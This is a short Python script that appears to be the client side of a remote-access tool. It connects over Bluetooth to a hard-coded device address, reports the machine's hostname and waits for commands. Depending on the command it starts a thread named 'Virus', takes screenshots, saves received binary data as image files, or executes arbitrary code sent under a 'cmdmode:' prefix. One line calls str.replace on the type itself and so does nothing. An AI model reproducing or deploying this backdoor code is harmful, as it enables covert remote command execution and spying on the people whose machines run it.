import socket
import ClientUI
import threading
import pyautogui
import os 

screeniecounter = 0
fileerror= 0
client = socket.socket(socket.AF_BLUETOOTH, socket.SOCK_STREAM, socket.BTPROTO_RFCOMM)
client.connect(("6c:2f:80:71:84:8b", 4))

client.send(socket.gethostname().encode())
th = threading.Thread(target=ClientUI.Virus,daemon=True)

ima = b""
try:
    while True:
        data = client.recv(9999)
        if not data:
            break
        
        try:
            data = data.decode()
        except Exception as e:
            with open("img"+str(fileerror)+".png","wb") as file:
                file.write(data)
            fileerror += 1
            continue

        print(data)
        if data == "1":
           client.send(ClientUI.Connect().encode())
        elif data == "2" and not th.is_alive():
            th.start()
        elif data == "3":
            pyautogui.screenshot().save("Screenshot"+str(screeniecounter) + ".png")
            screeniecounter = screeniecounter + 1
        elif "cmdmode:" in data:
            str.replace('cmdmode:', '')
            exec(data)

    print("Update Window")
except OSError as e:
    pass

client.close()
if ClientUI.window and ClientUI.window.winfo_exists():
    ClientUI.window.quit()